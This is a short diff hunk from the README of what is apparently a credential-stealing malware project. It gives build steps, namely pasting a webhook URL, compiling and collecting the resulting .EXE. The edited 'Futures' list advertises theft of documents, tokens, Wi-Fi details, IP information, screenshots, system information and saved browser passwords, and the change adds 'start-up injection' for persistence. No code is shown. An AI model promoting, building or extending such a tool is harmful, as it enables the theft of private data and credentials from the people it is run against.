@@ -9,4 +9,4 @@ entergrations>webhooks and press create webhook, copy the webhook URL and paste 
 after its done compiling you can now go to the dist folder, and there should be an .EXE file placed in the folder
 
 # Futures 📊
-documents📁 , tokens 🍪 , WI-FI information 🌐 , IP-information 🏠, screenshot 💻, system information 🛠️ , saved browser passwords 🎫.
+documents📁 , tokens 🍪 , WI-FI information 🌐 , IP-information 🏠, screenshot 💻, system information 🛠️ , saved browser passwords 🎫 , start-up injection 🧨.
